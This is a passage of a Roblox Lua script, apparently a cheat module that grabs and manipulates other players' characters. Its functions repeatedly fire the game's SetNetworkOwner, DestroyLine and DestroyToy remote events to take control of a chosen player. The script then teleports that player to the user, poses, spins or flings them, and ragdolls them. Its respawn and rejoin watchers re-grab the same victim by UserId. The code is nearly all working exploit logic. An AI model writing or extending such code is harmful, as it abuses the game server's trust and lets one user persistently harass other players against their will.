            RightLegPosition = { X = -0.5, Y = 5, Z = 1.5 },
            RightLegRotation = { X = 0, Y = 0, Z = 90 },
            HeadPosition = { X = 0, Y = 0, Z = 0 },
            HeadRotation = { X = 0, Y = 0, Z = 0 },
        },
        Pose4 = {
            HoldPosition = { X = 1.5, Y = -8.5, Z = -1.5 },
            HoldRotation = { X = 0, Y = 0, Z = 0 },
            LeftArmPosition = { X = 0, Y = 0, Z = 0 },
            LeftArmRotation = { X = 0, Y = 0, Z = 0 },
            RightArmPosition = { X = 0, Y = 0, Z = 0 },
            RightArmRotation = { X = 0, Y = 0, Z = 0 },
            LeftLegPosition = { X = 0, Y = 0, Z = 0 },
            LeftLegRotation = { X = 0, Y = 0, Z = 0 },
            RightLegPosition = { X = 1.5, Y = 0, Z = 0 },
            RightLegRotation = { X = 0, Y = 0, Z = 0 },
            HeadPosition = { X = 0, Y = 9, Z = 0 },
            HeadRotation = { X = 0, Y = 0, Z = 0 },
        },
        Pose5 = {
            HoldPosition = { X = 0, Y = -3, Z = -6 },
            HoldRotation = { X = 270, Y = 0, Z = 0 },
            LeftArmPosition = { X = -1, Y = 0.5, Z = 0 },
            LeftArmRotation = { X = 180, Y = 0, Z = 0 },
            RightArmPosition = { X = 1, Y = 0.5, Z = 0 },
            RightArmRotation = { X = 180, Y = 0, Z = 0 },
            LeftLegPosition = { X = 0, Y = -3, Z = 0 },
            LeftLegRotation = { X = 0, Y = 0, Z = 0 },
            RightLegPosition = { X = 0, Y = -2, Z = 0.5 },
            RightLegRotation = { X = 45, Y = 0, Z = 0 },
            HeadPosition = { X = 0, Y = 1.5, Z = -0.5 },
            HeadRotation = { X = 270, Y = 0, Z = 0 },
        },
        Pose6 = {
            HoldPosition = { X = 5.5, Y = 0.5, Z = -1.5 },
            HoldRotation = { X = 345, Y = 39, Z = 0 },
            LeftArmPosition = { X = 2, Y = 0.5, Z = 0 },
            LeftArmRotation = { X = 0, Y = 43, Z = 121 },
            RightArmPosition = { X = -2, Y = 0, Z = 0 },
            RightArmRotation = { X = 64, Y = 112, Z = 0 },
            LeftLegPosition = { X = -0.5, Y = -2, Z = 0 },
            LeftLegRotation = { X = 349, Y = 0, Z = 360 },
            RightLegPosition = { X = 0.5, Y = -2, Z = 0 },
            RightLegRotation = { X = 345, Y = 360, Z = 10 },
            HeadPosition = { X = 0, Y = 1.5, Z = 0 },
            HeadRotation = { X = 0, Y = 344, Z = 0 },
        },
        Pose7 = {
            HoldPosition = { X = 0, Y = -2, Z = -10 },
            HoldRotation = { X = 90, Y = 0, Z = 0 },
            LeftArmPosition = { X = -1.5, Y = 0, Z = 0 },
            LeftArmRotation = { X = 270, Y = 0, Z = 315 },
            RightArmPosition = { X = 1.5, Y = 0, Z = 0 },
            RightArmRotation = { X = 270, Y = 0, Z = 45 },
            LeftLegPosition = { X = -1, Y = -1.5, Z = 0 },
            LeftLegRotation = { X = 90, Y = 0, Z = 0 },
            RightLegPosition = { X = 1, Y = -1.5, Z = 0 },
            RightLegRotation = { X = 90, Y = 0, Z = 0 },
            HeadPosition = { X = 0, Y = 1.5, Z = 0 },
            HeadRotation = { X = 0, Y = 0, Z = 0 },
        },
        JojoStand = {
            HoldPosition = { X = -4.5, Y = 0.5, Z = -1.5 },
            HoldRotation = { X = 8, Y = 349, Z = 0 },
            LeftArmPosition = { X = 1.5, Y = 0, Z = 0 },
            LeftArmRotation = { X = 15, Y = 62, Z = 41 },
            RightArmPosition = { X = -1.5, Y = 0.5, Z = -0.5 },
            RightArmRotation = { X = 65, Y = 149, Z = 6 },
            LeftLegPosition = { X = -0.5, Y = -2, Z = 0 },
            LeftLegRotation = { X = 349, Y = 0, Z = 360 },
            RightLegPosition = { X = 0.5, Y = -2, Z = 0 },
            RightLegRotation = { X = 345, Y = 360, Z = 10 },
            HeadPosition = { X = 0, Y = 1.5, Z = 0 },
            HeadRotation = { X = 0, Y = 344, Z = 0 },
        },
    }

    FGM.CustomPresets = {}

    LIMB_OPTIONS = { 'Torso', 'Head', 'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg' }

    LIMB_SECTION_MAP = {
        Torso = { pos = 'HoldPosition', rot = 'HoldRotation' },
        Head = { pos = 'HeadPosition', rot = 'HeadRotation' },
        ['Left Arm'] = { pos = 'LeftArmPosition', rot = 'LeftArmRotation' },
        ['Right Arm'] = { pos = 'RightArmPosition', rot = 'RightArmRotation' },
        ['Left Leg'] = { pos = 'LeftLegPosition', rot = 'LeftLegRotation' },
        ['Right Leg'] = { pos = 'RightLegPosition', rot = 'RightLegRotation' },
    }

    PART_NAME_MAP = {
        Torso = 'Torso',
        Head = 'Head',
        ['Left Arm'] = 'Left Arm',
        ['Right Arm'] = 'Right Arm',
        ['Left Leg'] = 'Left Leg',
        ['Right Leg'] = 'Right Leg',
    }

    function SnapValue(value, step)
        if step == 0 then return value end
        return math.round(value / step) * step
    end

    function FGM.ApplySnap(section, axis, value)
        if not FGM.Configuration.SnapEnabled then return value end
        local isRot = section:find('Rotation')
        local step = isRot and FGM.Configuration.SnapRotStep or FGM.Configuration.SnapPosStep
        return SnapValue(value, step)
    end

    function BuildTargetCFrame(partName, torsoWorldCFrame, config)
        local posKey, rotKey
        if partName == 'Left Arm' then posKey, rotKey = 'LeftArmPosition', 'LeftArmRotation'
        elseif partName == 'Right Arm' then posKey, rotKey = 'RightArmPosition', 'RightArmRotation'
        elseif partName == 'Left Leg' then posKey, rotKey = 'LeftLegPosition', 'LeftLegRotation'
        elseif partName == 'Right Leg' then posKey, rotKey = 'RightLegPosition', 'RightLegRotation'
        elseif partName == 'Head' then posKey, rotKey = 'HeadPosition', 'HeadRotation'
        else return nil end
        local p = config[posKey]
        local r = config[rotKey]
        if not p or not r then return nil end
        return torsoWorldCFrame * CFrame.new(p.X, p.Y, p.Z) * CFrame.Angles(math.rad(r.X), math.rad(r.Y), math.rad(r.Z))
    end

    function LerpCFrame(a, b, alpha)
        return a:Lerp(b, alpha)
    end

    function FGM.GetCharacter(player)
        local char = player.Character
        if not char then char = player.CharacterAdded:Wait() end
        return char
    end

    function InitSmoothedCFrames(targetCharacter)
        FGM.State.SmoothedCFrames = {}
        local parts = { 'Torso', 'Head', 'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg' }
        for _, name in ipairs(parts) do
            local part = targetCharacter:FindFirstChild(name)
            if part then FGM.State.SmoothedCFrames[name] = part.CFrame end
        end
    end

    function SetupBodyParts(targetCharacter)
        local bodyParts = { 'Head', 'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg' }
        for _, partName in pairs(bodyParts) do
            local part = targetCharacter:FindFirstChild(partName)
            if part then
                part.Anchored = false
                part.CanCollide = true
                part.Massless = true
            end
        end
        InitSmoothedCFrames(targetCharacter)
    end

    function FGM.ClearLimbHighlight()
        local state = FGM.State
        if state.LimbHighlight and state.LimbHighlight.Parent then
            state.LimbHighlight:Destroy()
        end
        state.LimbHighlight = nil
        state.HighlightedLimb = nil
    end

    function FGM.ApplyLimbHighlight(limbName)
        FGM.ClearLimbHighlight()
        local state = FGM.State
        local target = state.TargetCharacter
        if not target then return end
        local partName = PART_NAME_MAP[limbName]
        if not partName then return end
        local part = target:FindFirstChild(partName)
        if not part then return end
        local highlight = Instance.new('SelectionBox')
        highlight.Adornee = part
        highlight.Color3 = Color3.fromRGB(0, 120, 255)
        highlight.LineThickness = 0.05
        highlight.SurfaceTransparency = 0.6
        highlight.SurfaceColor3 = Color3.fromRGB(0, 100, 255)
        highlight.Parent = FGM.Workspace.CurrentCamera
        state.LimbHighlight = highlight
        state.HighlightedLimb = limbName
    end

    function FGM.ExecuteGrabTP(targetChar)
        local state = FGM.State
        local myChar = FGM.GetCharacter(FGM.LocalPlayer)
        if not myChar then return false end
        local myHRP = myChar:FindFirstChild('HumanoidRootPart')
        local targetHRP = targetChar and targetChar:FindFirstChild('HumanoidRootPart')
        if not myHRP or not targetHRP then return false end
        if targetChar.Parent ~= FGM.Workspace then return false end
        local savedPos = myHRP.CFrame
        for _ = 1, 5 do
            FGM._FireDestroyLine(targetHRP)
            FGM.RunService.RenderStepped:Wait()
            FGM._FireSetNetworkOwner(targetHRP, targetHRP.CFrame)
        end
        local dist = (targetHRP.Position - myHRP.Position).Magnitude
        if dist >= 5 then
            pcall(function()
                myHRP.CFrame = targetHRP.CFrame
            end)
            task.wait(0.2)
            pcall(function()
                FGM._FireSetNetworkOwner(targetHRP, targetHRP.CFrame)
            end)
            task.wait(0.05)
            myHRP.AssemblyLinearVelocity = Vector3.zero
            myHRP.AssemblyAngularVelocity = Vector3.zero
            targetHRP.AssemblyLinearVelocity = Vector3.zero
            targetHRP.AssemblyAngularVelocity = Vector3.zero
            myHRP.CFrame = savedPos
            task.wait(0.2)
        end
        for _, v in pairs(targetChar:GetChildren()) do
            if v:IsA('BasePart') then
                pcall(function()
                    v.AssemblyLinearVelocity = Vector3.zero
                    v.AssemblyAngularVelocity = Vector3.zero
                end)
            end
        end
        local cfg = FGM.Configuration
        local holdCF = myHRP.CFrame * CFrame.new(cfg.HoldPosition.X, cfg.HoldPosition.Y, cfg.HoldPosition.Z) * CFrame.Angles(math.rad(cfg.HoldRotation.X), math.rad(cfg.HoldRotation.Y), math.rad(cfg.HoldRotation.Z))
        local torso = targetChar:FindFirstChild('Torso')
        if torso then
            pcall(function()
                torso.CFrame = holdCF
                torso.AssemblyLinearVelocity = Vector3.zero
                torso.AssemblyAngularVelocity = Vector3.zero
            end)
        end
        state.ActiveNetworkTarget = targetHRP
        return true
    end

    function FGM.StartPersistentGrab()
        FGM.StopPersistentGrab()
        FGM.State.PersistentGrabActive = true
        FGM.State.PersistentGrabThread = task.spawn(function()
            while FGM.State.PersistentGrabActive do
                task.wait(0.1)
                local state = FGM.State
                local target = state.TargetCharacter
                if not target or not state.FigureGrabEnabled then continue end
                local myChar = FGM.LocalPlayer.Character
                if not myChar then continue end
                local myHRP = myChar:FindFirstChild('HumanoidRootPart')
                local targetHRP = target:FindFirstChild('HumanoidRootPart')
                if not myHRP or not targetHRP then continue end
                FGM._FireDestroyLine(targetHRP)
                FGM._FireSetNetworkOwner(targetHRP, targetHRP.CFrame)
                local dist = (targetHRP.Position - myHRP.Position).Magnitude
                if dist >= FGM.Configuration.AutoTPDistance then
                    if not state.DistanceTPInProgress then
                        state.DistanceTPInProgress = true
                        task.spawn(function()
                            if state.TargetPlayer then
                                FGM.BringTargetToMe(state.TargetPlayer)
                            end
                            task.wait(0.3)
                            state.DistanceTPInProgress = false
                        end)
                    end
                end
            end
        end)
    end

    function FGM.StopPersistentGrab()
        FGM.State.PersistentGrabActive = false
        if FGM.State.PersistentGrabThread then
            pcall(function() task.cancel(FGM.State.PersistentGrabThread) end)
            FGM.State.PersistentGrabThread = nil
        end
    end

    function FGM.WaitForCharacterReady(targetPlayer, timeout)
        timeout = timeout or 15
        local deadline = tick() + timeout
        while tick() < deadline do
            local char = targetPlayer.Character
            if char and char.Parent and char:FindFirstChild('HumanoidRootPart') and char:FindFirstChild('Torso') and char:FindFirstChild('Humanoid') and char.Humanoid.Health > 0 then
                return char
            end
            task.wait(0.15)
        end
        return nil
    end

    function FGM.ReattachToCharacter(newCharacter)
        local state = FGM.State
        if not state.FigureGrabEnabled then return end
        local myChar = FGM.GetCharacter(FGM.LocalPlayer)
        if not myChar then return end
        FGM.ToggleAutoRagdoll(false)
        task.wait(0.1)
        state.TargetCharacter = newCharacter
        state.ActiveNetworkTarget = newCharacter:FindFirstChild('HumanoidRootPart')
        SetupBodyParts(newCharacter)
        if state.TargetPlayer then
            FGM.BringTargetToMe(state.TargetPlayer)
        end
        task.wait(0.1)
        RunHeartbeat(myChar)
        if state.AutoRagdollToggle then
            FGM.ToggleAutoRagdoll(true)
        end
        if state.HighlightedLimb then
            FGM.ApplyLimbHighlight(state.HighlightedLimb)
        end
    end

    function FGM.WatchForRespawn(targetPlayer)
        if FGM.State.RespawnConnection then
            pcall(function() FGM.State.RespawnConnection:Disconnect() end)
            FGM.State.RespawnConnection = nil
        end
        FGM.State.RespawnConnection = targetPlayer.CharacterAdded:Connect(function()
            if not FGM.State.FigureGrabEnabled then return end
            local readyChar = FGM.WaitForCharacterReady(targetPlayer, 15)
            if not readyChar then return end
            FGM.ReattachToCharacter(readyChar)
        end)
    end

    function FGM.WatchForRejoin(targetPlayer)
        if FGM.State.RejoinConnection then
            pcall(function() FGM.State.RejoinConnection:Disconnect() end)
            FGM.State.RejoinConnection = nil
        end
        local targetUserId = targetPlayer.UserId
        local removingConn
        removingConn = FGM.Players.PlayerRemoving:Connect(function(leavingPlayer)
            if leavingPlayer.UserId ~= targetUserId then return end
            if not FGM.State.FigureGrabEnabled then
                pcall(function() removingConn:Disconnect() end)
                FGM.State.RejoinConnection = nil
                return
            end
            task.spawn(function()
                local rejoinConn
                rejoinConn = FGM.Players.PlayerAdded:Connect(function(newPlayer)
                    if newPlayer.UserId ~= targetUserId then return end
                    pcall(function() rejoinConn:Disconnect() end)
                    pcall(function() removingConn:Disconnect() end)
                    FGM.State.RejoinConnection = nil
                    if not FGM.State.FigureGrabEnabled then return end
                    local readyChar = FGM.WaitForCharacterReady(newPlayer, 30)
                    if not readyChar then return end
                    FGM.State.TargetPlayer = newPlayer
                    FGM.WatchForRespawn(newPlayer)
                    FGM.WatchForRejoin(newPlayer)
                    FGM.ReattachToCharacter(readyChar)
                end)
            end)
        end)
        FGM.State.RejoinConnection = removingConn
    end

    function FGM.CopyAnimationsFromLimbs()
        if not FGM.State.AnimationCopyEnabled then return end
        if not FGM.State.TargetCharacter then return end
        local MyCharacter = FGM.GetCharacter(FGM.LocalPlayer)
        if not MyCharacter then return end
        local MyHRP = MyCharacter:FindFirstChild('HumanoidRootPart')
        local MyTorso = MyCharacter:FindFirstChild('Torso')
        local TargetTorso = FGM.State.TargetCharacter:FindFirstChild('Torso')
        if not MyHRP or not MyTorso or not TargetTorso then return end
        local cfg = FGM.Configuration
        local holdCFrame = MyHRP.CFrame * CFrame.new(cfg.HoldPosition.X, cfg.HoldPosition.Y, cfg.HoldPosition.Z) * CFrame.Angles(math.rad(cfg.HoldRotation.X), math.rad(cfg.HoldRotation.Y), math.rad(cfg.HoldRotation.Z))
        pcall(function()
            TargetTorso.CFrame = holdCFrame
            local torsoRelative = MyHRP.CFrame:ToObjectSpace(MyTorso.CFrame)
            TargetTorso.CFrame = TargetTorso.CFrame * torsoRelative.Rotation
            TargetTorso.Velocity = FGM.State.VectorZero
            TargetTorso.RotVelocity = FGM.State.VectorZero
        end)
        local limbs = { 'Head', 'Right Arm', 'Left Arm', 'Right Leg', 'Left Leg' }
        for _, limbName in ipairs(limbs) do
            local myPart = MyCharacter:FindFirstChild(limbName)
            local targetPart = FGM.State.TargetCharacter:FindFirstChild(limbName)
            if myPart and targetPart then
                pcall(function()
                    local relative = MyTorso.CFrame:ToObjectSpace(myPart.CFrame)
                    targetPart.CFrame = TargetTorso.CFrame:ToWorldSpace(relative)
                    targetPart.Velocity = FGM.State.VectorZero
                    targetPart.RotVelocity = FGM.State.VectorZero
                end)
            end
        end
    end

    function FGM.CheckDistanceAndTP(myHRP, targetChar) end

    function RunHeartbeat(MyCharacter)
        local cfg = FGM.Configuration
        local state = FGM.State
        local zero = state.VectorZero
        local bodyParts = { 'Head', 'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg' }
        local lastTime = tick()
        if state.FigureGrabConnection then
            pcall(function() state.FigureGrabConnection:Disconnect() end)
        end
        state.FigureGrabConnection = FGM.RunService.Heartbeat:Connect(function()
            local now = tick()
            local dt = math.min(now - lastTime, 0.1)
            lastTime = now
            local target = state.TargetCharacter
            if not target or not MyCharacter then return end
            local MyRoot = MyCharacter:FindFirstChild('HumanoidRootPart')
            local TargetTorso = target:FindFirstChild('Torso')
            if not MyRoot or not TargetTorso then return end
            if state.SpinEnabled then
                state.SpinAngle = (state.SpinAngle + state.SpinSpeed * dt) % 360
            end
            if state.OscillateEnabled then
                state.OscillateTimer = state.OscillateTimer + dt
            end
            local holdOffsetZ = cfg.HoldPosition.Z
            if state.OscillateEnabled then
                holdOffsetZ = holdOffsetZ + math.sin(state.OscillateTimer * state.OscillateSpeed * math.pi * 2) * state.OscillateAmount
            end
            local baseHoldCFrame = MyRoot.CFrame * CFrame.new(cfg.HoldPosition.X, cfg.HoldPosition.Y, holdOffsetZ) * CFrame.Angles(math.rad(cfg.HoldRotation.X), math.rad(cfg.HoldRotation.Y), math.rad(cfg.HoldRotation.Z))
            if state.HoldAtCameraEnabled then
                local cam = FGM.Workspace.CurrentCamera
                baseHoldCFrame = cam.CFrame * CFrame.new(0, 0, -math.abs(cfg.HoldPosition.Z))
            end
            if state.GravityFlipEnabled then
                local pos = baseHoldCFrame.Position
                local myY = MyRoot.Position.Y
                local flippedY = myY - (pos.Y - myY)
                local rot = baseHoldCFrame.Rotation
                baseHoldCFrame = CFrame.new(pos.X, flippedY, pos.Z) * rot
            end
            local holdCFrame = baseHoldCFrame
            if state.ForceLookAtEnabled then
                local lookDir = (MyRoot.Position - baseHoldCFrame.Position)
                if lookDir.Magnitude > 0.01 then
                    holdCFrame = CFrame.new(baseHoldCFrame.Position, baseHoldCFrame.Position + lookDir)
                end
            end
            if state.ForceUprightEnabled then
                local p = holdCFrame.Position
                holdCFrame = CFrame.new(p) * CFrame.Angles(0, math.rad(cfg.HoldRotation.Y), 0)
            end
            if state.LockRotationEnabled then
                holdCFrame = CFrame.new(holdCFrame.Position) * state.LockedRotation
            end
            if state.SpinEnabled then
                holdCFrame = holdCFrame * CFrame.Angles(0, math.rad(state.SpinAngle), 0)
            end
            if state.FreezeLimbsEnabled and next(state.FrozenCFrames) then
                for partName, frozenCF in pairs(state.FrozenCFrames) do
                    local part = target:FindFirstChild(partName)
                    if part and part.Parent then
                        pcall(function()
                            part.CFrame = frozenCF
                            part.Velocity = zero
                            part.RotVelocity = zero
                        end)
                    end
                end
                if cfg.DampingEnabled then
                    local prev = state.SmoothedCFrames.Torso or holdCFrame
                    local alpha = math.min(1, cfg.DampingSpeed * dt)
                    state.SmoothedCFrames.Torso = LerpCFrame(prev, holdCFrame, alpha)
                    pcall(function()
                        TargetTorso.CFrame = state.SmoothedCFrames.Torso
                        TargetTorso.Velocity = zero
                        TargetTorso.RotVelocity = zero
                    end)
                else
                    pcall(function()
                        TargetTorso.CFrame = holdCFrame
                        TargetTorso.Velocity = zero
                        TargetTorso.RotVelocity = zero
                    end)
                end
                FGM._FireSetNetworkOwner(state.ActiveNetworkTarget, holdCFrame)
                return
            end
            if cfg.DampingEnabled then
                local prev = state.SmoothedCFrames.Torso or holdCFrame
                local alpha = math.min(1, cfg.DampingSpeed * dt)
                state.SmoothedCFrames.Torso = LerpCFrame(prev, holdCFrame, alpha)
                pcall(function()
                    TargetTorso.CFrame = state.SmoothedCFrames.Torso
                    TargetTorso.Velocity = zero
                    TargetTorso.RotVelocity = zero
                end)
            else
                pcall(function()
                    TargetTorso.CFrame = holdCFrame
                    TargetTorso.Velocity = zero
                    TargetTorso.RotVelocity = zero
                end)
            end
            if state.VelSuppressEnabled then
                for _, part in pairs(target:GetChildren()) do
                    if part:IsA('BasePart') then
                        pcall(function()
                            part.AssemblyLinearVelocity = zero
                            part.AssemblyAngularVelocity = zero
                        end)
                    end
                end
            end
            if state.AnimationCopyEnabled then
                FGM.CopyAnimationsFromLimbs()
            else
                local torsoCF = TargetTorso.CFrame
                for _, partName in pairs(bodyParts) do
                    local part = target:FindFirstChild(partName)
                    if part and part.Parent then
                        local targetCF = BuildTargetCFrame(partName, torsoCF, cfg)
                        if targetCF then
                            if cfg.DampingEnabled then
                                local prev = state.SmoothedCFrames[partName] or targetCF
                                local alpha = math.min(1, cfg.DampingSpeed * dt)
                                state.SmoothedCFrames[partName] = LerpCFrame(prev, targetCF, alpha)
                                pcall(function()
                                    part.CFrame = state.SmoothedCFrames[partName]
                                    part.Velocity = zero
                                    part.RotVelocity = zero
                                end)
                            else
                                pcall(function()
                                    part.CFrame = targetCF
                                    part.Velocity = zero
                                    part.RotVelocity = zero
                                end)
                            end
                        end
                    end
                end
            end
            FGM._FireSetNetworkOwner(state.ActiveNetworkTarget, holdCFrame)
        end)
    end

    function FGM.GetPlayerList()
        local list = {}
        for _, plr in pairs(FGM.Players:GetPlayers()) do
            if plr ~= FGM.LocalPlayer then
                table.insert(list, plr.Name)
            end
        end
        return list
    end

    function FGM.GrabPlayerByName(playerName)
        local targetPlayer = FGM.Players:FindFirstChild(playerName)
        if not targetPlayer then return end
        local targetChar = targetPlayer.Character
        if not targetChar then return end
        if not targetChar:FindFirstChild('Torso') then return end
        local MyCharacter = FGM.GetCharacter(FGM.LocalPlayer)
        if not MyCharacter then return end
        if FGM.State.FigureGrabEnabled then
            FGM.ToggleFigureGrab()
            task.wait(0.1)
        end
        local state = FGM.State
        state.TargetCharacter = targetChar
        state.TargetPlayer = targetPlayer
        state.FigureGrabEnabled = true
        state.LastGrabTargetRef = targetChar:FindFirstChild('HumanoidRootPart')
        state.ActiveNetworkTarget = targetChar:FindFirstChild('HumanoidRootPart')
        FGM.Configuration.LineDistance = 5
        FGM.BringTargetToMe(targetPlayer)
        task.wait(0.15)
        SetupBodyParts(targetChar)
        FGM.StartPersistentGrab()
        FGM.WatchForRespawn(targetPlayer)
        FGM.WatchForRejoin(targetPlayer)
        RunHeartbeat(MyCharacter)
        if state.AutoRagdollToggle then
            FGM.ToggleAutoRagdoll(true)
        end
        if state.HighlightedLimb then
            FGM.ApplyLimbHighlight(state.HighlightedLimb)
        end
    end

    function FGM.ToggleFigureGrab()
        if not FGM.State.FigureGrabEnabled then
            local tn = FGM.State.SelectedTarget
            if not tn or tn == "" then return end
            local targetPlayer = FGM.Players:FindFirstChild(tn)
            if not targetPlayer then return end
            local targetChar = targetPlayer.Character
            if not targetChar then return end
            if not targetChar:FindFirstChild('Torso') then return end
            local MyCharacter = FGM.GetCharacter(FGM.LocalPlayer)
            if not MyCharacter then return end
            local myHRP = MyCharacter:FindFirstChild('HumanoidRootPart')
            if myHRP then
                FGM.State.SavedPosition = myHRP.CFrame
            end
            local bringSuccess = FGM.BringTargetToMe(targetPlayer)
            if not bringSuccess then return end
            task.wait(0.2)
            targetChar = targetPlayer.Character
            if not targetChar then return end
            local state = FGM.State
            state.TargetCharacter = targetChar
            state.TargetPlayer = targetPlayer
            state.FigureGrabEnabled = true
            state.LastGrabTargetRef = targetChar:FindFirstChild('HumanoidRootPart')
            state.ActiveNetworkTarget = targetChar:FindFirstChild('HumanoidRootPart')
            FGM.Configuration.LineDistance = 5
            SetupBodyParts(targetChar)
            FGM.StartPersistentGrab()
            if targetPlayer then
                FGM.WatchForRespawn(targetPlayer)
                FGM.WatchForRejoin(targetPlayer)
            end
            RunHeartbeat(MyCharacter)
            if state.HighlightedLimb then
                FGM.ApplyLimbHighlight(state.HighlightedLimb)
            end
            if state.AutoRagdollToggle then
                FGM.ToggleAutoRagdoll(true)
            end
        else
            local state = FGM.State
            if state.FlingOnReleaseEnabled and state.TargetCharacter then
                local targetHRP = state.TargetCharacter:FindFirstChild('HumanoidRootPart')
                local myChar = FGM.GetCharacter(FGM.LocalPlayer)
                local myHRP = myChar and myChar:FindFirstChild('HumanoidRootPart')
                if targetHRP and myHRP then
                    local flingDir = (targetHRP.Position - myHRP.Position)
                    if flingDir.Magnitude > 0 then flingDir = flingDir.Unit end
                    pcall(function()
                        targetHRP.AssemblyLinearVelocity = flingDir * state.FlingForce
                    end)
                end
            end
            FGM.JumpAndReturn()
            FGM.ClearLimbHighlight()
            FGM.StopPersistentGrab()
            state.FigureGrabEnabled = false
            state.AnimationCopyEnabled = false
            state.SmoothedCFrames = {}
            state.FrozenCFrames = {}
            state.SpinAngle = 0
            state.OscillateTimer = 0
            state.DistanceTPInProgress = false
            state.ActiveNetworkTarget = nil
            state.LastTargetUserId = nil
            state.LastTargetHRP = nil
            FGM.ToggleAutoRagdoll(false)
            if state.FigureGrabConnection then
                pcall(function() state.FigureGrabConnection:Disconnect() end)
                state.FigureGrabConnection = nil
            end
            if state.RespawnConnection then
                pcall(function() state.RespawnConnection:Disconnect() end)
                state.RespawnConnection = nil
            end
            if state.RejoinConnection then
                pcall(function() state.RejoinConnection:Disconnect() end)
                state.RejoinConnection = nil
            end
            state.TargetCharacter = nil
            state.TargetPlayer = nil
            state.LastGrabTargetRef = nil
        end
    end

    function FGM.SetAnimationCopy(enabled)
        FGM.State.AnimationCopyEnabled = enabled
    end

    function FGM.ResetPose()
        local limbSections = {
            'LeftArmPosition', 'LeftArmRotation', 'RightArmPosition', 'RightArmRotation',
            'LeftLegPosition', 'LeftLegRotation', 'RightLegPosition', 'RightLegRotation',
            'HeadPosition', 'HeadRotation', 'HoldRotation',
        }
        for _, section in ipairs(limbSections) do
            local t = FGM.Configuration[section]
            if t then
                for axis in pairs(t) do t[axis] = 0 end
            end
        end
        FGM.Configuration.HoldPosition = { X = 0, Y = 0, Z = -5 }
    end

    function FGM.ApplyPreset(presetName)
        local preset = FGM.Presets[presetName]
        if not preset then return end
        for section, values in pairs(preset) do
            if FGM.Configuration[section] then
                for axis, value in pairs(values) do
                    FGM.Configuration[section][axis] = value
                end
            end
        end
    end

    function FGM.UpdateConfig(section, axis, rawValue)
        local cfg = FGM.Configuration
        if cfg[section] and cfg[section][axis] ~= nil then
            cfg[section][axis] = FGM.ApplySnap(section, axis, rawValue)
        end
    end

    function FGM.SnapshotLimbsForFreeze()
        local state = FGM.State
        local target = state.TargetCharacter
        state.FrozenCFrames = {}
        if not target then return end
        for _, name in ipairs({ 'Head', 'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg' }) do
            local part = target:FindFirstChild(name)
            if part then state.FrozenCFrames[name] = part.CFrame end
        end
    end

    function FGM.GetCurrentConfigSnapshot()
        local cfg = FGM.Configuration
        local snapshot = {}
        local keys = {
            'HoldPosition', 'HoldRotation', 'LeftArmPosition', 'LeftArmRotation',
            'RightArmPosition', 'RightArmRotation', 'LeftLegPosition', 'LeftLegRotation',
            'RightLegPosition', 'RightLegRotation', 'HeadPosition', 'HeadRotation',
        }
        for _, key in ipairs(keys) do
            if cfg[key] then
                snapshot[key] = { X = cfg[key].X, Y = cfg[key].Y, Z = cfg[key].Z }
            end
        end
        return snapshot
    end

    function FGM.SaveCustomPreset(name)
        if not name or name == '' then return false end
        FGM.CustomPresets[name] = FGM.GetCurrentConfigSnapshot()
        return true
    end

    function FGM.LoadCustomPreset(name)
        local preset = FGM.CustomPresets[name]
        if not preset then return false end
        for section, values in pairs(preset) do
            if FGM.Configuration[section] then
                for axis, value in pairs(values) do
                    FGM.Configuration[section][axis] = value
                end
            end
        end
        return true
    end

    function FGM.DeleteCustomPreset(name)
        if not FGM.CustomPresets[name] then return false end
        FGM.CustomPresets[name] = nil
        return true
    end

    function FGM.GetCustomPresetNames()
        local names = {}
        for name in pairs(FGM.CustomPresets) do
            table.insert(names, name)
        end
        table.sort(names)
        return names
    end

    function GetActiveSections()
        local limb = FGM.State.SelectedLimb
        return LIMB_SECTION_MAP[limb] or LIMB_SECTION_MAP.Torso
    end

    -- ============================
    -- FIX: Define missing functions before use
    -- ============================
    function FGM._FireDestroyLine(part)
        if FGM.DestroyLine and part and part.Parent then
            pcall(function()
                FGM.DestroyLine:FireServer(part)
            end)
        end
    end

    function FGM._FireSetNetworkOwner(part, cf)
        if FGM.SetNetworkOwner and part and part.Parent then
            pcall(function()
                FGM.SetNetworkOwner:FireServer(part, cf)
            end)
        end
    end

    function FGM.BringTargetToMe(target)
        if not target then return false end
        local myChar = FGM.LocalPlayer.Character
        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if not myRoot then return false end
        local savedPos = myRoot.CFrame
        if not target.Character then return false end
        local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
        local tHum = target.Character:FindFirstChild("Humanoid")
        if not tRoot or not tHum then return false end
        myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0, 2.5)
        myRoot.AssemblyLinearVelocity = Vector3.zero
        task.wait(0.05)
        for i = 1, 8 do
            pcall(function() FGM.SetNetworkOwner:FireServer(tRoot, tRoot.CFrame) end)
            task.wait(0.01)
        end
        for i = 1, 4 do
            pcall(function() FGM.DestroyLine:FireServer(tRoot) end)
            task.wait(0.01)
        end
        tRoot.CFrame = savedPos * CFrame.new(0, 0, 2)
        tRoot.AssemblyLinearVelocity = Vector3.zero
        pcall(function() tHum.PlatformStand = true end)
        task.wait(0.05)
        myRoot.CFrame = savedPos
        myRoot.AssemblyLinearVelocity = Vector3.zero
        return true
    end

    function FGM.JumpAndReturn()
        local myChar = FGM.LocalPlayer.Character
        local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if not myHRP then return end
        FGM.State.IsReturning = true
        if FGM.State.SavedPosition then
            myHRP.CFrame = FGM.State.SavedPosition
            myHRP.Velocity = Vector3.zero
            myHRP.AssemblyAngularVelocity = Vector3.zero
        end
        FGM.State.IsReturning = false
    end

    function FGM.ToggleAutoRagdoll(enabled)
        FGM.State.AutoRagdollEnabled = enabled
        if FGM.State.AutoRagdollConnection then
            FGM.State.AutoRagdollConnection:Disconnect()
            FGM.State.AutoRagdollConnection = nil
        end

        if not enabled then
            if FGM.State.RagdollPallet then
                pcall(function() FGM.DestroyToy:FireServer(FGM.State.RagdollPallet) end)
            end
            FGM.State.RagdollPallet = nil
            FGM.State.RagdollSoundPart = nil
            return
        end

        task.spawn(function()
            local myChar = FGM.LocalPlayer.Character
            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if not myHRP then return end

            FGM.MyToys = FGM.Workspace:FindFirstChild(FGM.LocalPlayer.Name .. "SpawnedInToys")
            if not FGM.MyToys then return end

